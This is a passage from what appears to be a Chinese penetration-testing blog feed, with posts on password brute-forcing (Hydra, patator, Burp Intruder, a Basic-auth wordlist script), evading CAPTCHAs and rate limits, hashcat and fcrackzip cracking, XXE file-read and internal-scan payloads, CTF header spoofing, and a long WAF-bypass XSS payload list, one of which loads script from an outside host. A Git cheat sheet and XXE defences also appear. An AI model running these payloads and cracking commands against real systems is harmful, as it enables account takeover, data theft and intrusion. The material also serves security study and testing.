彩虹表哈希破解 Ophcrack : 离线LMHash/NTHash破解 Fcrackzip/Truecrack等特定文件密码破解工具 Metasploit : 各种辅助测试脚本 Cupp.py : 社工字典生成 … 0x03 绕过检测Web层有WAF,Service有IDS/IPS,在测试的时候很容易被发现。在测试前,先通过扫描等方式判断是否有相应的防护,并采取相应手段.Web层可能有验证码,可能有每秒IP连接数限制,可能通过Cookie/Header等信息判断行为.在通过一系列测试后,(如何测试还是要自己探索的),采用最合理的针对方式绕过或尽量避免被检测而拦截枚举账户密码。 0x04 Web账户枚举Web账户枚举是平日遇到较多的情况 没有做严谨的验证码等防护. 发现别人留下的backdoor. 撞库扫号. 常见的绕过验证的可能: 页面无需刷新验证码无限次使用 密码输入错误数次弹出验证码，但更换账号不会出现验证码 修改Cookie或User-Agent伪装逃避验证码 可批量轮询使用代理ip枚举绕过 在Web枚举中,使用BurpSuite基本可以解决所有常见问题. 开启代理,打开Intercept,登陆网页,输入用户密码,数据包拦截下来,选择Send to Intruder,进入攻击模块. 其中四种模式: Sniper:只有一个payload,会将payload分别放在每个Fuzz点测试,默认选项,这也是新手发现Payload只能选择1的原因. Battering Ram:只有一个payload,会将payload同时放在多个Fuzz点测试. Pitchfork:多个payload,会将多个payload同一行同时放到相应Fuzz点测试.(适用扫号) Cluster Bomb:多个payload,payload在其Fuzz点循环测试,直到尝试所有可能.(适用多账户枚举密码) 选择好相应模式后,设置payload为runtime file,挂载字典文件.取消Payload Encoding. 如果发现网页有将用户的本地将密码计算MD5后提交,则需要在Payload Processing中添加计算MD5的过程. 设置好后也可添加正则匹配结果等等.之后可以Start attack了. 这个过程中,如果担心IP地址暴露,可以选择加入一个client-ip这个payload来代理ip。 0x05 HTTP基础认证抓包可以看到,以默认用户名admin,默认密码admin登陆路由,HTTP Header多的部分像是这样: Authorization: Basic YWRtaW46YWRtaW4= Base64解密即为admin:admin.针对基础认证密码破解,依旧可以使用,但需要对用户名密码先做处理即先base64编码下,一个demo脚本如下: #!/usr/bin/python #+------------------------------+ #@Author:Joy_nick #@Blog:http://byd.dropsec.xyz/ #+------------------------------+ import os.path,sys,base64 userfile = raw_input(&quot;input usr file:&quot;) passfile = raw_input(&quot;input pwd file:&quot;) outputfile = raw_input(&quot;input out file:&quot;) outputfile = open(outputfile, &quot;w&quot;) userInfile = open(userfile) passInfile = open(passfile) userLines = userInfile.readlines() passLines = passInfile.readlines() for userLine in userLines: for passLine in passLines: combinedLine = userLine.strip() + &apos;:&apos; + passLine.strip() print combinedLine outputfile.write(base64.b64encode(combinedLine) + &apos;\n&apos;) userInfile.close() passInfile.close() outputfile.close() 生成字典后以Burp爆破即可. 也可以使用Hydra hydra -L user.txt -P pass.txt -F http://demourl:2048/auth 其中-L和-P大写均为挂载字典,-F表示全局一旦发现合法用户密码即停止破解,亦可加入-t参数指定线程数. 0x06 服务密码破解常见服务如FTP/SSH/TELNET/POP3/1433等的破解枚举. FTP hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21 SSH hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22 patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg=&apos;Authentication failed.&apos; SMB hydra -L user.txt -P pass.txt -F smb://127.0.0.1 MSSQL hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433 0x07 社工字典生成以cupp.py工具为例,创建新字典使用: python cupp.py -i 用法： cupp.py [选项] h 帮助 i 交互式填写用户密码等相关信息 w 配置现有的字典文件 l 从库中下载 a 直接使用Alecto数据库的默认用户名和密码 v 版本信息 在填写相关信息后生成字典,然后就可以枚举了。 0x08 哈希破解普通哈希可以使用Ophcrack破解,官网给出了对应的彩虹表下载,当然,也可以直接查询. http://www.objectif-securite.ch/en/ophcrack.php 需要破解其他不常见密码哈希(借助已有web破解服务无法解决),暂时便只有三个相对高效的方法: 分布式 GPU 彩虹表 (没硬盘的就别想了) 而如果我们在知道密码的一定规则后,亦可按照规则破解密码. hashcat -m1800 -a3 hashdumpedfile --pw-min=7 --pw-max=11 &quot;hahaha?l?l?l?l&quot; 具体的hashcat密码破解详情请参考：HashCat使用手册 0x09 文件密码对于zip文件,由于加密方式没有rar强势,故被解密的可能性很大,一个kali下的破解工具命令如下: fcrackzip -b -v -c a -l 1-4 -u 1.zip -b指定暴力破解,-v显示详细信息,-c a指定密码为纯字母,-l 1-4指定密码长度位1-4位,-u指使用可能的密码进行解压缩测试(加上,否则会出现很多干扰密码) 具体的其他语法请参考：fcrackzip语法示例]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE Inject攻击与防御]]></title>
    <url>%2F2016%2F08%2F16%2FXXE-Inject%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x00 前言XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击. 在XML1.0标准⾥里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题. 0x01 简介DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 &lt;!DOCTYPE 根元素 [元素声明]&gt; &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD实体entity，一般分为参数实体(外部实体)和内部实体；参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀；内部实体是指用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用. &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 所以在XML中实体的用法如下： ENTITY的定义语法： &lt;!DOCTYPE filename [ &lt;!ENTITY entity-name &quot;entity-content&quot; ]&gt; //这就是DTD了 定义好的ENTITY在文档中通过“&amp;实体名;”来使用。类似于宏定义的一种东西。 0x02 威胁借助XXE,攻击者可以实现任意文件读取,DOS拒绝服务攻击以及代理扫描内网等. 对于不同XML解析器,对外部实体有不同处理规则,在PHP中默认处理的函数为: xml_parse和simplexml_load xml_parse的实现方式为expat库，默认情况不会解析外部实体,而simplexml_load默认情况下会解析外部实体,造成安全威胁. 除PHP外，在Java，Python等处理xml的组件及函数中都可能存在此问题. 0x03 语法举一个简单的例子： &lt;?php $fileread = &lt;&lt;&lt;XML &lt;!-- validators.en.xliff --&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file://C:/phpStudy/WWW/XXE/file.ext&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; XML; $data = simplexml_load_string($fileread); print_r($data); ?&gt; 如果要引用一个外部资源,可以借助各种协议，这里通过file:// 协议引入了外部实体. file:///path/to/file.ext http://url/file.ext php://filter/read=convert.base64-encode/resource=conf.php 也可读取网站内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://byd.dropsec.xyz/robots.txt&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 通过上面可以用来内网探测，如果安装了expect扩展组件甚至可以用来进行内网渗透。 如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 内部实体的这支持与否也是取决于解释器的。不同的浏览器不一样，不通语言默认也不一样。所以利用比较困难。 但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。 0x04 攻击1.拒绝服务 POC 2.内网信息 借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息. &lt;!ELEMENT portscan SYSTEM &apos;http://192.168.2.1/&apos; &gt; &lt;!ELEMENT smb SYSTEM &apos;\\192.168.2.1\c$&apos; &gt; &lt;!ELEMENT sql SYSTEM &apos;http://192.168.2.1/index.php?id=1;drop table myweb;#&apos; &gt; 3.文件读取 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 0x05 防御1、对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以可以提前加上: &lt;?php libxml_disable_entity_loader(true); ?&gt; 2、检查所使用的底层xml解析库，默认禁止外部实体的解析. 3、对于XMLReader和DOM方式解析. &lt;?php // with the XMLReader functionality: $doc = XMLReader::xml($badXml,&apos;UTF-8&apos;,LIBXML_NONET); // with the DOM functionality: $dom = new DOMDocument(); $dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); ?&gt;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 常用命令速查表]]></title>
    <url>%2F2016%2F08%2F15%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[Git 是目前世界上最先进的分布式版本控制系统（没有之一）。Git有什么特点？简单来说就是：高端大气上档次！ 0x01 分支master: 默认开发分支 Head： 默认开发分支 origin： 默认远程版本库 head^： Head的父提交 0x02 创建版本库$ git clone &lt;ur&gt; #克隆远程版本库 $ git init #初始化本地版本库 0x03 修改和提交$ git status #查看状态 $ git diff #查看变更内容 $ git add . #跟踪所有改动过的文件 $ git add &lt;file&gt; #跟踪指定文件 $ git mv &lt;old&gt; &lt;new&gt; #文件改名 $ git rm &lt;file&gt; #删除文件 $ git rm --cached &lt;file&gt; #停止跟踪文件但不删除 $ git commit -m &quot;commit message&quot;#提交所有更新过的文件 $ git commit --amend #修改最后一次提交 0x04 查看提交历史$ git log #查看提交历史 $ git log -p &lt;file&gt; #查看指定文件的提交历史 $ git blame &lt;file&gt; #以列表方式查看指定文件的提交历史 0x05 撤销$ git reset --hard HEAD #撤销工作目录中所有未提交文件的修改内容 $ git checkout HEAD &lt;file&gt; #撤销指定的未提交文件的修改内容 $ git revert &lt;commit&gt; #撤销指定的提交 0x06 分支与标签$ git branch #显示所有本地分支 $ git checkout &lt;branch/tag&gt; #切换到指定分支或者标签 $ git branch &lt;new-nbranch&gt; #创建新分支 $ git branch -d &lt;branch&gt; #删除本分支 $ git tag #列出所有本地标签 $ git tag &lt;tagname&gt; #基于最新提交创建标签 $ git tag -d &lt;tagname&gt; #删除标签 0x07 合并与衍合$ git merge &lt;branch&gt; #合并指定分支到当前分支 $ git rebase &lt;branch&gt; #衍合指定分支到当前分支 0x08 远程操作$ git remote -v #查看远程版本库信息 $ git remote show &lt;remote&gt; #查看指定远程版本库信息 $ git remote add &lt;remote&gt; &lt;url&gt; #添加远程版本库 $ git fetch &lt;remote&gt; #从远程库获取代码 $ git pull &lt;remote&gt; &lt;branch&gt; #下载代码及快速合并 $ git push &lt;remote&gt; &lt;branch&gt; #上传代码及快速合并 $ git push &lt;remote&gt; :&lt;branch/tagname&gt;#删除远程分支或标签 $ git push --tags #上传所有标签]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中一些绕过网站访问限制的技巧]]></title>
    <url>%2F2016%2F08%2F12%2FCTF%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[平时访问网站或者做 CTF 题的时候会遇到网站限制访问的问题，下面是一些小技巧，主要是通过 BurpSuite 拦截 HTTP 请求并根据需要修改 HTTP 请求头的内容来达到绕过的目的。 1、看起来只允许国外访问，有可能是 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)即可 2、浏览器类型限制：修改 HTTP 请求中的 User-Agent 3、IP地址限制：可能跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关，或者挂代理。 4、需要登录，可能是 Cookie 的问题，如果 Cookie 比较简单，试试能不能构造。 5、尝试查看 robots.txt 可以获得该网站的一些信息。 6、有一些加referer加上代理ip。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS一些小技巧]]></title>
    <url>%2F2016%2F08%2F12%2FXSS%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1、http://www.wooyun.org/bugs/wooyun-2013-034003 &lt;textarea/&gt;&quot;&gt;&lt;img src=1 onerror=&quot;with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&apos;//pxss.sinaapp.com/l6OBji&apos;&quot;&gt; &lt;textarea/&gt;&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt; 2、只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启xss filter。 3、可以利用字符编码来绕过XSS Filter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个&lt;meta charset=ISO-2022-KR&gt; 4、&lt;iframe srcdoc=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt; 不是以on开头的 又可以执行JS的iframe属性。 5、 &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&gt;aa&lt;/a&gt; 6、 &lt;a href=javascirpt:alert(1)&gt;请点击&lt;/a&gt; 7、 &lt;iframe/onload=alert(1)&gt; 8、 &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; 9、一些有趣的XSS Vector http://zone.wooyun.org/content/15121]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashCat使用手册]]></title>
    <url>%2F2016%2F08%2F10%2FHashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[0x00 背景Hashcat是一个已经有贴近完美的工作工具，支持像“PasswordsPro”，“约翰开膛手”基于规则的攻击。然而，对于一些未知的原因，他们两个不支持多线程。这是写Hashcat的唯一理由：为了利用现代CPU的多个核心。 0x01 简介Hashcat有两个主要的变种： 1.Hashcat 基于CPU的密码恢复工具 2.oclHashcat/cudaHashcat 一个GPU加速工具 许多由Hashcat支持的算法可以在更短的时间，通过使用证据充分的GPU加速被破解在oclHashcat（如MD5，SHA1，等等）利用。然而，并非所有的算法可以通过利用GPU的加速。Bcrypt就是一个很好的例子。由于种种因素，比如依赖于数据的分支，序列化和内存（以仅举几例），oclHashcat不是一个包罗万象的替代Hashcat。使用的话，低版本提示版本过低的话，改一下时间就行了）使用Hashcat没有任何限制，使用oclhashcat则必须满足AMD（的OpenCL）和Nvidia（CUDA）。 0x02 特性 Hashcat可用于Linux，OSX和Windows。oclHashcat仅适用于Linux和Windows 世界最快的密码破解 世界第一个也是唯一基于GPU规则引擎 自由 开源 多GPU（高达128 GPU）的 多散列（高达1亿散列） 多操作系统（Linux和Windows本地二进制文件） 多平台（OpenCL和CUDA支持） 多算法中（见下文） 资源利用率低，你仍然可以看电影或玩游戏而破裂 高度集中迭代现代哈希 基于重点字典攻击 支持分布式开裂 支持暂停 / 恢复而开裂 支持会话 支持恢复 支持读取单词文件 支持读取字标准输入 支持六角盐 支持十六进制字符集 内置基准系统 综合热看门狗 150+算法在考虑性能的实现 0x04 使用说明破解的hash类型使用 –help 查看破解类型 900 = MD4 0 = MD5 5100 = Half MD5 100 = SHA1 10800 = SHA-384 1400 = SHA-256 1700 = SHA-512 5000 = SHA-3(Keccak) 10100 = SipHash 6000 = RipeMD160 6100 = Whirlpool 6900 = GOST R 34.11-94 11700 = GOST R 34.11-2012 (Streebog) 256-bit 11800 = GOST R 34.11-2012 (Streebog) 512-bit 10 = md5($pass.$salt) 20 = md5($salt.$pass) 30 = md5(unicode($pass).$salt) 40 = md5($salt.unicode($pass)) 3800 = md5($salt.$pass.$salt) 3710 = md5($salt.md5($pass)) 2600 = md5(md5($pass) 4300 = md5(strtoupper(md5($pass))) 4400 = md5(sha1($pass)) 110 = sha1($pass.$salt) 120 = sha1($salt.$pass) 130 = sha1(unicode($pass).$salt) 140 = sha1($salt.unicode($pass)) 4500 = sha1(sha1($pass) 4700 = sha1(md5($pass)) 4900 = sha1($salt.$pass.$salt) 1410 = sha256($pass.$salt) 1420 = sha256($salt.$pass) 1430 = sha256(unicode($pass).$salt) 1440 = sha256($salt.unicode($pass)) 1710 = sha512($pass.$salt) 1720 = sha512($salt.$pass) 1730 = sha512(unicode($pass).$salt) 1740 = sha512($salt.unicode($pass)) 破解方式0 = Straight #直接字典破解 1 = Combination #组合破解 2 = Toggle-Case #切换不同文件破解 3 = Brute-force #掩码暴力破解 4 = Permutation #置换组合破解 5 = Table-Lookup #查表破解 8 = Prince 参数说明General: -m, --hash-type=NUM hash类型，引用上文数字 -a, --attack-mode=NUM 攻击类型，引用上文数字 -V, --version 版本 -h, --help 帮助文档 --quiet Suppress output Misc: --hex-salt 以十六进制给出 --hex-charset 以字符集给出 --runtime=NUM 运行num时间后终止 --status 启用状态 --status-timer=NUM 定时器 --status-automat 状态 Built-in charsets: #自定义字符集 ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?s = !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 - 0xff FIile: -o，--outfile =文件中定义OUTFILE已恢复哈希 --outfile格式= NUM定义恢复的散列OUTFILE格式，请参阅下面引用 --outfile-autohex-Disable禁止使用$ HEX []输出平原 -p，--separator = CHAR定义hashlists / outfile中分离炭 --show显示密码破解只（见--username） --left只（见--username）显示未开裂的密码 --username启用hashfile用户名忽略（推荐：也使用--show） 一旦它被破解--remove启用哈希删除 --stdout标准输出模式 --potfile，禁止不写potfile --debug模式= NUM（仅适用于通过使用规则的混合）定义调试模式， 见下面的参考资料 --debug文件=调试规则文件的输出文件（见--debug模式） -e，--salt-file =文件盐，文件无盐hashlists Increment: -i, --increment --increment-min=NUM 最小值 --increment-max=NUM 最大值 0x05 具体操作使用字典进行破解使用给的字典和hash进行破解 Hashcat.exe -m 500 example500.hash example.dict cudaHashcat32.exe -m 500 example500.hash example.dict &gt;result.txt 使用掩码进行破解48E231E66FF8943DB0F6D2B6CB6536D2（xiaoming123456）?l?l?l?l?l?l?l?l?d?d?d?d?d?d hashcat.exe -m 0 -a 3 48E231E66FF8943DB0F6D2B6CB6536D2 ?l?l?l?l?l?l?l?l?d?d?d?d?d?d HashCat参数优化HashCat本身考虑到系统资源的分配，默认参数下并没有最大化的来使用硬件资源。如果我们想要让破解速度最大化，就需要对一些参数进行配置。 Workload tuning 负载调优。该参数支持的值有1,8,40,80,160 --gpu-accel 160 可以让GPU发挥最大性能。 Gpu loops 负载微调该参数支持的值的范围是8-1024（有些算法只支持到1000）。 --gpu-loops 1024 可以让GPU发挥最大性能。 Segment size 字典缓存大小该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越好XD。 --segment-size 512 可以提高大字典破解的速度。]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>Hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS payload]]></title>
    <url>%2F2016%2F08%2F05%2FXSS-payload%2F</url>
    <content type="text"><![CDATA[收集的一些比较有用的XSS payload，用于绕过waf及一些应用程序，具体的分类就不说了，一看就明白的。 &lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt; \&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt; &lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror/=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror=\x00alert(0) /&gt; &lt;\x00img src=&apos;1&apos; onerror=alert(0) /&gt; &lt;script\x00&gt;alert(1)&lt;/script&gt; &lt;i\x00mg src=&apos;1&apos; onerror=alert(0) /&gt; &lt;img/src=&apos;1&apos;/onerror=alert(0)&gt; &lt;img\x0bsrc=&apos;1&apos;\x0bonerror=alert(0)&gt; &lt;img src=&apos;1&apos;&apos;onerror=&apos;alert(0)&apos;&gt; &lt;img src=&apos;1&apos;&quot;onerror=&quot;alert(0)&quot;&gt; &lt;img src=&apos;1&apos;\x00onerror=alert(0)&gt; &lt;img src=&apos;1&apos;onerror=alert(0)&gt; Firefox (\x09, \x0a, \x0d, \x20) Chrome (Any character \x01 to \x20) &lt;iframe src=&quot;\x01javascript:alert(0)&quot;&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt; &lt;img src=&apos;1&apos; onerror=&apos;alert(0)&apos; &lt; &lt;&lt;script&gt;alert(0)&lt;/script&gt; &lt;style&gt;body{background-color:expression\(alert(1))}&lt;/style&gt; &lt;script&gt;document.write(&apos;&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;&apos;);&lt;/script&gt; HTML Encoding &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; &lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;&lt;/iframe&gt; URL Encoding &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt; CSS Hexadecimal Encoding &lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;Joker&lt;/div&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E&apos;);&lt;/script&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt; JavaScript &lt;script&gt;alert(123)&lt;/script&gt; &lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt; Overlong UTF-8 &lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC &gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE &apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 &quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 &lt;img src=&quot;1&quot; onnerror=&quot;alert(1)&quot;&gt; %E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE UTF-7 (Missing charset?) &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- Unicode .NET Ugliness &lt;script&gt;alert(1)&lt;/script&gt; %uff1cscript%uff1ealert(1)%uff1c/script%uff1e Classic ASP &lt;img src=&quot;1&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&gt; %u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A and/or Useful features. HTML 5 (Not comphrensive) &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt; &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadstart=&quot;alert(1)&quot; /&gt; Usuage of non-existent elements &lt;blah style=&quot;blah:expression(alert(1))&quot; /&gt; CSS Comments &lt;div style=&quot;z:exp/*anything*/res/*here*/sion(alert(1))&quot; /&gt; JavaScript functions &lt;script&gt;window[&apos;alert&apos;](0)&lt;/script&gt; &lt;script&gt;parent[&apos;alert&apos;](1)&lt;/script&gt; &lt;script&gt;self[&apos;alert&apos;](2)&lt;/script&gt; &lt;script&gt;top[&apos;alert&apos;](3)&lt;/script&gt; JavaScript into HTML &lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt; &lt;script&gt; var junk = &apos;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;; &lt;/script&gt; HTML CSS &lt;style&gt; body { background-image:url(&apos;http://www.blah.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;); } &lt;/style&gt; XML documents &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;someElement&gt; &lt;a xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;a:body onload=&apos;alert(1)&apos;/&gt;&lt;/a&gt; &lt;/someElement&gt; URI Schemes &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; (IE) &lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) HTTP Parameter Pollution http://target.com/something.xxx?a=val1&amp;a=val2 ASP.NET a = val1,val2 ASP a = val1,val2 JSP a = val1 PHP a = val2 &lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt; &lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox) http://target.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1) &lt;iframe src=&quot;http://target.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;&quot; name=&quot;alert(1)&quot;&gt;&lt;/iframe&gt; &lt;script&gt; $=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())(); &lt;/script&gt; &lt;script&gt; 